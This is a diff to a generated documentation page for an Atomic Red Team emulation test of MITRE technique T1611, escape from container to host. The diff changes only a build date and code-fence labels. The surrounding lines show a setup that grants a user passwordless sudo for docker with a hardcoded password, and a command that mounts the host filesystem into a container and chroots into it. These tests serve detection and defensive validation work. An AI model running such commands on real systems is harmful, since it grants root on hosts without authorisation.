@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1611"
 attack_technique_name: "Escape to Host"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/T1611.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "sh"
 aliases:
   - "39fab1bc-fcb9-406f-bc2e-fe03e42ff0e4"
@@ -54,13 +54,13 @@ Docker
 
 ### Prerequisite Check
 
-```text
+```untitled
 command -v docker &> /dev/null && echo "Docker is installed" || { echo "Docker is not installed."; exit 1; }
 ```
 
 ### Get Prerequisite
 
-```text
+```untitled
 echo "You should install docker manually."
 ```
 
@@ -68,13 +68,13 @@ Docker Privileged User
 
 ### Prerequisite Check
 
-```text
+```untitled
 sudo -l -U #{username} | grep "(ALL) NOPASSWD: /usr/bin/docker"
 ```
 
 ### Get Prerequisite
 
-```text
+```untitled
 USERNAME="#{username}"
 PASSWORD="password123"
 SUDO_COMMAND="/usr/bin/docker"
@@ -89,14 +89,14 @@ SUDOERS_FILE="/etc/sudoers.d/$USERNAME"
 
 ### Command
 
-```sh
+```bash
 echo "Current user: #{username}"
 sudo -u docker_user sh -c "sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"
 ```
 
 ### Cleanup
 
-```sh
+```bash
 USERNAME="#{username}"; SUDOERS_FILE="/etc/sudoers.d/$USERNAME"; id "$USERNAME" &>/dev/null && userdel -r "$USERNAME" && echo -e "$USERNAME is deleted."; [[ -f "$SUDOERS_FILE" ]] && rm -f "$SUDOERS_FILE"; echo "Cleanup complete."
 ```
 
